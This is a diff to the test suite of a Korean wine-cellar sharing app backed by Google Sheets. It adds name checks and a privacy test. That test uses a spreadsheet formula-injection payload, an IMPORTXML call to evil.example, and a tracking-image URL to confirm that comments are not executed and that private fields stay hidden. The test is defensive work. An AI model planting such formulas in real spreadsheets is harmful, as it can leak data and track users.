@@ -521,8 +521,9 @@ test('와인 추천: 마신 와인만 올라가고, 다른 셀러에게 보이�
   const lee = setupUser(env, 'lee', '5678');
   const wineSheet = env.ss.sheets[0];
   // 보유 중인 와인·남의 와인·행이 밀린 경우는 거절
-  assert(/마신 와인만/.test(env.call('recommendWine', { token: kim, row: 2, comment: 'x', price: '1000' }).error));
+  assert(/마신 와인만/.test(env.call('recommendWine', { token: kim, row: 2, comment: 'x', price: '1000', expectedName: '샤토 A' }).error));
   assert(/내 와인이 아니에요/.test(env.call('recommendWine', { token: kim, row: 4, comment: 'x', price: '1000' }).error));
+  assert(/새로고침/.test(env.call('recommendWine', { token: kim, row: 3, comment: 'x', price: '1000' }).error), '와인명 확인 필수');
   assert(/목록이 바뀌었어요/.test(env.call('recommendWine', { token: kim, row: 3, comment: 'x', price: '1000', expectedName: '샤토 A' }).error));
   const wineBefore = JSON.parse(JSON.stringify(wineSheet.rows));
   let r = env.call('recommendWine', { token: kim, row: 3, comment: '산뜻해요', price: '38,000원', expectedName: '샤토 B' });
@@ -591,7 +592,7 @@ test('같은 와인을 다시 추천하면 이미 추천했다고 알려주고, 
   wineSheet.set(4, 1, ' 샤토  b ');
   env.call('markDrunk', { token: lee, row: 4, info: { '평점': 5 }, expectedName: ' 샤토  b ' });
   wineSheet.set(4, 4, '2020');
-  r = env.call('recommendWine', { token: lee, row: 4, comment: '저도요', price: '선물받음' });
+  r = env.call('recommendWine', { token: lee, row: 4, comment: '저도요', price: '선물받음', expectedName: ' 샤토  b ' });
   assert(r.ok && r.addedTo && !r.again, JSON.stringify(r));
   const list = env.call('getRecommendations', { token: lee });
   assert.strictEqual(list.length, 3);
@@ -604,7 +605,8 @@ test('추천 취소는 행을 지우지 않고, 내 추천만 취소할 수 있�
   const kim = setupUser(env, 'kim', '1234');
   const lee = setupUser(env, 'lee', '5678');
   const rec = env.call('recommendWine', { token: kim, row: 3, comment: '굿', price: '20000', expectedName: '샤토 B' });
-  assert(/내 추천이 아니에요/.test(env.call('cancelRecommendation', { token: lee, row: rec.rowIndex }).error));
+  assert(/내 추천이 아니에요/.test(env.call('cancelRecommendation', { token: lee, row: rec.rowIndex, expectedName: '샤토 B' }).error));
+  assert(/목록이 바뀌었어요/.test(env.call('cancelRecommendation', { token: kim, row: rec.rowIndex }).error), '와인명 확인 필수');
   assert(/목록이 바뀌었어요/.test(env.call('cancelRecommendation', { token: kim, row: rec.rowIndex, expectedName: '샤토 A' }).error));
   assert(env.call('cancelRecommendation', { token: kim, row: rec.rowIndex, expectedName: '샤토 B' }).ok);
   const recSheet = env.ss.getSheetByName('추천공유');
@@ -650,6 +652,28 @@ test('계정 삭제 때는 그 사람의 추천만 지우고 다른 사람 추�
   const list = env.call('getRecommendations', { token: admin });
   assert.deepStrictEqual(list.map(x => x['와인명']), ['남의 와인']);
   assert.strictEqual(list[0].canCancel, true, '관리자는 내릴 수 있음');
+});
+
+test('추천: 다른 셀러의 개인 정보(메모·구매처·와인 행·아이디)는 내려가지 않고, 추천글은 수식으로 실행되지 않는다', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const kim = setupUser(env, 'kim', '1234');
+  const lee = setupUser(env, 'lee', '5678');
+  const ws = env.ss.sheets[0];
+  const h = ws.rows[0];
+  const set = (name, v) => { let c = h.indexOf(name); if (c === -1) { h.push(name); c = h.length - 1; } ws.set(3, c + 1, v); };
+  set('메모', '비밀 메모'); set('구매처', '동네 와인샵'); set('라벨사진', 'https://evil.example/track.png');
+  const r = env.call('recommendWine', { token: kim, row: 3, comment: '=IMPORTXML("https://evil.example","//a")', price: '1000', expectedName: '샤토 B' });
+  assert(r.ok, JSON.stringify(r));
+  const recSheet = env.ss.getSheetByName('추천공유');
+  assert.deepStrictEqual(recSheet.formulas, {}, '추천 시트에 수식이 생기지 않음');
+  const x = env.call('getRecommendations', { token: lee })[0];
+  const text = JSON.stringify(x);
+  assert(!/비밀 메모|동네 와인샵/.test(text), '메모·구매처는 안 내려감');
+  assert(!/"kim"/.test(JSON.stringify(Object.assign({}, x, { '추천인이름': '' }))), '아이디는 안 내려감');
+  assert.strictEqual(x['와인행'], '', '남의 와인 행 번호는 안 내려감');
+  assert.strictEqual(x['라벨사진'], '', '외부 주소 사진은 안 보여줌');
+  // lee의 와인 목록에는 kim의 와인이 섞이지 않는다
+  assert(env.call('getWines', { token: lee }).wines.every(w => w['소유자'] === 'lee'));
 });
 
 console.log(passed + '개 통과' + (process.exitCode ? ' (실패 있음)' : ''));
